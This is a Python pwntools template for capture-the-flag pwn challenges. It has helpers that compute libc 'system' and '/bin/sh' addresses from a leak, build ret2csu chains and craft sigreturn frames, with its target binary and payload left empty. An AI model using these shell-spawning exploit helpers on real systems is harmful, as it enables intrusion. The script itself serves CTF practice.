from pwn import *
from LibcSearcher import *
from pwnlib.dynelf import ctypes
from pwnlib.fmtstr import make_atoms_simple
from ctypes import *

context(arch="amd64", os="linux", log_level="debug")
# context(arch="amd64",os="linux",log_level="debug")
binary = "../"
libc = "../Libcs/libc.so.6_3"

rop = ROP(binary)
elf = ELF(binary)

libc_elf = ELF(libc)
libc_dll = cdll.LoadLibrary(libc)


local = 0

ip, port = "61.147.171.105", 29144
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    p = remote("node5.buuoj.cn", port)


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc_elf):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#
# gdb.attach(p)
payload = b""
p.sendline(payload)

p.interactive()
